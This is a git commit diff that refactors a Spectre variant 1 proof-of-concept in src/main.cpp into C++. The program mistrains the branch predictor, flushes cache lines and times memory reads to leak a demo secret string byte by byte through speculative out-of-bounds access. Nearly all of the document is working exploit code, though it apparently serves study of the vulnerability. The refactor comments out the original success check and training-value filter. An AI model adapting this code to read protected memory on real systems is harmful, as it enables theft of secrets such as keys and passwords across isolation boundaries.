0182797906eef7dd22fa1c927bafc8962cf57264
Maxim Kurin <kurinmaksim@mail.ru>
2022-09-13 16:50:27 +0300

    Refactor to introduce c++ here

--- src/main.cpp
+++ src/main.cpp
@@ -1,32 +1,47 @@
+#include <emmintrin.h>
 #include <fmt/core.h>
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <x86intrin.h> /* for rdtscp and clflush */
-#include <string>
 #include <fmt/format.h>
+#include <stdint.h>
+#include <string>
+#include <x86intrin.h> /* for rdtscp and clflush */
 
 /********************************************************************
 Victim code.
 ********************************************************************/
-const int NUM_PAGES = 512;
 unsigned int array1_size = 16;
 uint8_t unused1[64];
-uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
-uint8_t array2[NUM_PAGES * 512];
+// uint8_t array2[256 * 512];
 
-const char* secret = "I Love Minecraft";
+const char *secret = "Minecraft ONE LOVE";
 
-uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
+static void force_read(uint8_t *p) { asm volatile("" : : "r"(*p) : "memory" ); }
 
-void victim_function(size_t x)
-{
-	if (x < array1_size)
-	{
-		temp &= array2[array1[x] * 512];
-	}
+static int64_t read_tsc() {
+  unsigned int junk;
+  return __rdtscp(&junk);
 }
+
+static std::pair<int, int> top_two_scores(const auto &range) {
+  int j = 0;
+  int k = 0;
+  for (int i = 0; i < range.size(); i++) {
+    if (range[i] >= range[j]) {
+      k = j;
+      j = i;
+    } else if (range[i] >= range[k]) {
+      k = i;
+    }
+  }
+  return {j, k};
+}
+
+// void victim_function(size_t x) {
+//   if (x < array1_size) {
+//     force_read(&array2[array1[x] * 512]);
+//   }
+// }
 
 /********************************************************************
 Analysis code
@@ -34,120 +49,92 @@ Analysis code
 constexpr auto CACHE_HIT_THRESHOLD = 80; /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2])
-{
-	static int results[NUM_PAGES];
-	int tries, i, j, k, mix_i;
-	unsigned int junk = 0;
-	size_t training_x, x;
-	register uint64_t time1, time2;
-	volatile uint8_t* addr;
+void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2]) {
+  static uint8_t timing_array[256 * 512];
+  memset(timing_array, 1, sizeof(timing_array));
 
-	for (i = 0; i < NUM_PAGES; i++)
-		results[i] = 0;
+  auto scores = std::array<int, 256>{};
 
-	for (tries = 999; tries > 0; tries--)
-	{
-		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < NUM_PAGES; i++)
-			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+  int best = 0;
+  int second_best = 0;
+  size_t training_x, x;
+  uint64_t time1, time2;
 
-		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--)
-		{
-			_mm_clflush(&array1_size);
-			for (volatile int z = 0; z < 100; z++)
-			{
-			} /* Delay (can also mfence) */
+  for (int tries = 100; tries > 0; tries--) {
+    /* Flush timing_array[256*(0..255)] from cache */
+    for (int i = 0; i < 256; i++)
+      _mm_clflush(&timing_array[i * 512]); /* intrinsic for clflush instruction */
 
-			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
-			x = training_x ^ (x & (malicious_x ^ training_x));
+    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+    training_x = tries % array1_size;
+    for (int j = 40; j >= 0; j--) {
+      _mm_clflush(&array1_size);
+      for (volatile int z = 0; z < 100; z++) {
 
-			/* Call the victim! */
-			victim_function(x);
-		}
+      } /* Delay (can also mfence) */
 
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		for (i = 0; i < NUM_PAGES; i++)
-		{
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++; /* cache hit - add +1 to score for this value */
-		}
+      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+      /* Avoid jumps in case those tip off the branch predictor */
+      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+      x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
+      x = training_x ^ (x & (malicious_x ^ training_x));
 
-		/* Locate highest & second-highest results results tallies in j/k */
-		j = k = -1;
-		for (i = 0; i < NUM_PAGES; i++)
-		{
-			if (j < 0 || results[i] >= results[j])
-			{
-				k = j;
-				j = i;
-			}
-			else if (k < 0 || results[i] >= results[k])
-			{
-				k = i;
-			}
-		}
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
-	}
-	results[0] ^= junk; /* use junk so code above won't get optimized out*/
-	value[0] = j;
-	score[0] = results[j];
-	value[1] = k;
-	score[1] = results[k];
+      /* Call the victim! */
+      if (x < array1_size) {
+        force_read(&timing_array[array1[x] * 512]);
+      }
+    }
+
+    unsigned int junk = 0;
+
+    /* Time reads. Order is lightly mixed up to prevent stride prediction */
+    for (int i = 0; i < 256; i++) {
+      int mix_i = ((i * 167) + 13) & 255;
+      volatile uint8_t *addr = &timing_array[mix_i * 512];
+      time1 = read_tsc(); /* READ TIMER */
+      junk = *addr; /* MEMORY ACCESS TO TIME */
+      time2 = read_tsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      if (time2 <= CACHE_HIT_THRESHOLD) // && mix_i != array1[tries % array1_size])
+        scores[mix_i]++; /* cache hit - add +1 to score for this value */
+    }
+
+    /* Locate highest & second-highest results results tallies in j/k */
+    std::tie(best, second_best) = top_two_scores(scores);
+
+    // if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+    //   break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+  }
+  // results[0] ^= junk; /* use junk so code above won't get optimized out*/
+  value[0] = best;
+  score[0] = scores[best];
+  value[1] = second_best;
+  score[1] = scores[second_best];
 }
 
-int main(int argc, const char* * argv)
-{
-	fmt::print("Putting '{}' in memory, address {}\n", secret, (void*)secret);
-	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
+int main(int argc, const char **argv) {
+  fmt::print("Putting '{}' in memory, address {}\n", secret, (void *)secret);
+  auto malicious_x = static_cast<size_t>(secret - (char *)array1); /* default for malicious_x */
 
-	fmt::print("secret = {}\n", (void*)secret);
-	fmt::print("array1 = {}\n", (void*)array1);
-	fmt::print("malicious_x = {}\n", (void*)malicious_x);
-	int32_t score[2];
-	int32_t len = strlen(secret);
-	int32_t value[2];
+  fmt::print("secret = {}\n", (void *)secret);
+  fmt::print("array1 = {}\n", (void *)array1);
+  fmt::print("malicious_x = {}\n", (void *)malicious_x);
 
-	for (size_t i = 0; i < sizeof(array2); i++)
-		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-	// if (argc == 3)
-	// {
-	// 	sscanf(argv[1], "%p", (void * *)(&malicious_x));
-	// 	malicious_x -= (size_t)array1; /* Convert input value into a pointer */
-	// 	sscanf(argv[2], "%d", &len);
-	// 	printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
-	// }
+  int32_t score[2];
+  int32_t value[2];
 
-	auto secret_message = std::string{};
-	secret_message.reserve(len);
+  for (int i = strlen(secret); i > 0; --i) {
+    // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+    readMemoryByte(malicious_x++, value, score);
+    // fmt::print("{}", (char)value[0]);
+    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+    printf("0x%02X='%c' score=%d ", value[0],
+           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+    if (score[1] > 0)
+      printf("(second best: 0x%02X='%c' score=%d)", value[1],
+             (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
+             score[1]);
+    printf("\n");
+  }
 
-	printf("Reading %d bytes:\n", len);
-	while (--len >= 0)
-	{
-		// printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-		readMemoryByte(malicious_x++, value, score);
-		secret_message += (char)value[0];
-		printf("%c", (char)value[0]);
-		// printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-		// printf("0x%02X='%c' score=%d ", value[0],
-		//        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-		// if (score[1] > 0)
-		// 	printf("(second best: 0x%02X='%c' score=%d)", value[1],
-		// 		   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
-		// 		   score[1]);
-		// printf("\n");
-	}
-	// printf("Secret: %s\n", secret_message.c_str());
-	return (0);
+  return 0;
 }
